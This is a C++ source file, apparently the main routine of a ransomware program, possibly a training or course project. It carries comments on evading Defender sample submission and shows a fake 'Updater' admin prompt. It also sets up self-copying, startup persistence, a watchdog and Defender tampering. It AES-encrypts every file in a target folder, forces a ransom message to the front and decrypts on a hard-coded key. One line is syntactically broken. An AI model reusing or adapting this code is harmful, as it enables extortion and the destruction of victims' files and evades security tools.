#include "pers/pers.h"
#include "pers/include.h"
#include "encryption/cryptor.h"

using namespace std;
// !!ВАЖНО!!
// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ
// ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    persistence::RemoveCloseButton();
    SetConsoleTitle("don't try to close this window it won't help");
    ShowWindow(Console, 0);
    char path[MAX_PATH];
    if (!persistence::isUserAdmin()) {
        MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
        persistence::restartAsAdmin();
        return 0;
    }
    Sleep(5000);
    if (persistence::copyAndRunSelf() != 0) {
        if (persistence::copyAndRunSelf() == 2){
            persistence::addToStartup();
            HANDLE hWatchdogMutex = CreateMutexA(NULL, FALSE, "Global\\Watchademic");
            if (GetLastError() == ERROR_ALREADY_EXISTS) {
                std::cout << "Already working!" << std::endl;
                return 0;
            }
            ShellExecuteA(nullptr, "runas", "C:\\Windows\\SystemApps\\WinUpdater.exe", nullptr, "C:\\Windows\\SystemApps", SW_SHOWNORMAL);
            persistence::watchdogLoop();
        }
        return 0;
    }
    HANDLE hHackademicMutex = CreateMutexA(NULL, FALSE, "Global\\hackademic");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Already working!" << std::endl;
        return 0;
    }
    if (!persistence::checkAndCreateFile("lafkildatnn.dat")) {
        persistence::DefenderOwner();
        persistence::addToStartup();
        Sleep(1500);
        // persistence::reset();
        Sleep(rand() % 5000 + 5000);
        // persistence::restartSystem();
        return 0;
    }
    std::thread killerThread(persistence::StopExe); // Запускаем фоновый поток
    killerThread.detach();
    Sleep(2000);
    // тут основной процесс закрепления 
    std::string hwid = "C:\\Windows\\SysWOW64\\" + persistence::getDiskSerial() + ".txt";


    // { ENCRYPTION } //

    std::string enc_path;
    enc_path = "C:\\dummy\\";
    
    std::cout << "[i] Working within  " << enc_path << ".\n";
    AES256CBC AES;

    AES.generateKey();
    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
        std::string filename = entry.path().string();
        if (!std::filesystem::is_directory(filename))
            AES.encryptFile(filename);
    }
    { END ENCRYPTION } //
    ShowWindow(Console, 1);
    std::thread ForceOpen(persistence::ForceConsoleToFront);
    ForceOpen.detach();
    persistence::CryptMessage();
    std::string fakeKey;
    while (fakeKey != "123") {
        std::cin >> fakeKey;
        Sleep(5000); // Пауза 5 секунд перед следующей проверкой
    }

    AES.keyFromFile();
    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
        std::string filename = entry.path().string();
        if (!std::filesystem::is_directory(filename))
            AES.decryptFile(filename);
    }

    persistence::cleanfile();
    persistence::cleanreg();
    system("shutdown /r /f /t 30");
    persistence::deleteMainFiles();
    return 0;
}
